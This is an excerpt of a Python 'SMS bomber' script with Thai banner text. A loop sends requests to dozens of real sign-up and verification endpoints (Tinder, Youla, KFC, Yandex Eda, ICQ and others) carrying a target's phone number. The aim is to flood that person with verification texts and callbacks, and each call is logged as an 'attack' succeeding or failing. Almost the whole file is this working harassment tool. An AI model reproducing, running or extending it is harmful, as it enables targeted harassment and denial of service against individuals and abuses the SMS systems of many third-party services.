...
[👽]ต้องใส่รหัสประเทศทุกครั้ง / Must enter the country code every time
[👽]Facebook : https://www.facebook.com/xyuioert.20
[👽]Github : https://github.com/dffgrockgamerch00123
    """
...
def start():
    info = Fore.BLUE+Style.BRIGHT+f'\n[👽เบอร์]{phone}\n[👽จำนวน] {count}'+'\n[👽]ระสังแบตจะหมดไว☢\nหยุดให้ออกจากแอพ'+Style.RESET_ALL
    print(info)
    global iteration
    iteration = 0
    while iteration < count:
        try:
            ...
            # 1 раз в минуту
            print(nice+"☠Kastaโจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Kastaโจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://kasta.ua/api/v2/login/", data={'phone': _phone})
            print(nice+"☠Kasta จมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Kasta โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://izi.ua/api/auth/register", json={"phone": _phone9, "name": "Олег", "is_terms_accepted": "true"})
            print(nice+"☠IZI โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠IZI โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://junker.kiev.ua/postmaster.php", data={
            'tel': junker_phone,'name': _name,'action':'callme',
            })
            print(nice+"☠Junker โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Junker โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://youla.ru/web-api/auth/request_code", data={'phone': _phone})
            print(nice+"☠Youla โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Youla โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://cloud.mail.ru/api/v2/notify/applink',json={"phone": "+" + _phone, "api": 2, "email": "email","x-email": "x-email"})
            print(nice+"☠MailRu Cloud โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠MailRu Cloud โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://myapi.beltelecom.by/api/v1/auth/check-phone?lang=ru', data={'phone': _phone})
            requests.post(f"https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone={_phone9}")
            print(nice+"☠BELTELECOM3 โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠BELTELECOM3 โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': _phone}, headers={})
            print(nice+"☠Tinder โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Tinder โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            ...
            print(nice+"☠Getmancar โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Getmancar โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://www.icq.com/smsreg/requestPhoneValidation.php", data={"msisdn": _phone,"locale": "en","countryCode": "ru","version": "1","k": "ic1rtwz1s1Hj1O0r","r": "46763"})
            print(nice+"☠ICQ โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠ICQ โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://api.pozichka.ua/v1/registration/send", json={"RegisterSendForm": {"phone": _phone9}})
            print(nice+"☠Pozichka โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Pozichka โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post(f'https://secure.online.ua/ajax/check_phone/?reg_phone={_phone}')
            print(nice+"☠SecureOnline โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠SecureOnline โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://www.sportmaster.ua/?module=users&action=SendSMSReg&phone=+{}'.format(_phone))
            print(nice+"☠SportMaster โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠SportMaster โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.get("https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper", params={"oper": 9, "callmode": 1, "phone": _phone9})
            print(nice+"☠Звонок โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Звонок โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://city24.ua/personalaccount/account/registration", data={"PhoneNumber": _phone},)
            print(nice+"☠City24 โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠City24 โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://helsi.me/api/healthy/accounts/login",json={"phone": _phone, "platform": "PISWeb"},)
            print(nice+"☠Helsi โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Helsi โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://cloud.mail.ru/api/v2/notify/applink",json={"phone": "+" + _phone, "api": 2, "email": email})
            print(nice+"☠CloudMail โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠CloudMail โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://auth.multiplex.ua/login", json={"login": _phone},)
            print(nice+"☠Multiplex โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Multiplex โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://account.my.games/signup_send_sms/", data={"phone": _phone},)
            print(nice+"☠MyGames โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠MyGames โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.get("https://cabinet.planetakino.ua/service/sms", params={"phone": _phone})
            print(nice+"☠Planetakino โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Planetakino โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
        ...
        try:
            ...
            print(nice+"☠LiST โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠LiST โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://www.mvideo.ru/internal-rest-api/common/atg/rest/actors/VerificationActor/getCode',params={"pageName": "registerPrivateUserPhoneVerificatio"},data={"phone": _phone, "recaptcha": 'off', "g-recaptcha-response": ""})
            print(nice+"☠MVideo โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠MVideo โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru',data={'phone_number': _phone})
            print(nice+"☠Tinder โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
        ...
        try:
            ...
            print(nice+"☠Twitch โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Twitch โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://lk.belkacar.ru/register', data={'phone': _phone9})
            print(nice+"☠BelkaCar โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠BelkaCar โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://api.ivi.ru/mobileapi/user/register/phone/v6",data={"phone": _phone})
            print(nice+"☠IVI โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠IVI โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            ...
            print(nice+"☠SportMaster, BelkaCar โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠SportMaster โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
        ...
        try:
            ...
            print(nice+"☠NovaLiniya โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠NovaLiniya โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://mobileplanet.ua/register", data={"klient_name": _name,"klient_phone": "+" + _phone,"klient_email": _email})
            print(nice+"☠MPlanet โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠MPlanet โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post( "https://api.delitime.ru/api/v2/signup", data={"SignupForm[username]": _phone, "SignupForm[device_type]": 3})
            print(nice+"☠DELIMOBIL โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠DELIMOBIL โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://apteka366.ru/login/register/sms/send', data={"phone":_phone})
            print(nice+"☠Apteka 366 โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print("☠Apteka 366 โจมตีไม่สำเร็จ")
        try:
        ...
        try:
            ...
            print(nice+"☠Друг Вокруг โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Друг Вокруг โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://api.ennergiia.com/auth/api/development/lor', json={"referrer":"ennergiia", "phone": _phone9})
            print(nice+"☠Energiia โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Energiia โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            ...
            print(nice+"☠Fundayshop โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Fundayshop โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://gorzdrav.org/login/register/sms/send', data={"phone": _phone})
            print(nice+"☠Gorzdrav โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Gorzdrav โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://app-api.kfc.ru/api/v1/common/auth/send-validation-sms', data={"phone": _phone9})
            print(nice+"☠KFC โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠KFC โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://api-production.viasat.ru/api/v1/auth_codes', json={"msisdn": _phone9})
            print(nice+"☠Viasat โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Viasat โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={"phone_number":_phone})
            print(nice+"☠Yandex Food โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Yandex Food โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://www.citilink.ru/registration/confirm/phone/{}/'.format(_phone9))
            print(nice+"☠Сitilink โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Сitilink โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post('https://eda.yandex/api/v1/user/request_authentication_code', json={'phone_number': '+' + _phone})
            print(nice+"☠Yandex Eda โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Yandex Eda โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.post("https://my.dianet.com.ua/send_sms/", data={"phone": phone})
            print(nice+"☠Dianet โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Dianet โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            requests.get("https://api.eldorado.ua/v1/sign/", params={"login": phone, "step": "phone-check", "fb_id": "null", "fb_token": "null", "lang": "ru",})
            print(nice+"☠Eldorado โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Eldorado โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        try:
            ...
            print(nice+"☠Shafa โจมตีสำเร็จ"+Style.RESET_ALL)
        except:
            print(fail+"☠Shafa โจมตีไม่สำเร็จ"+Style.RESET_ALL)
        iteration += 1
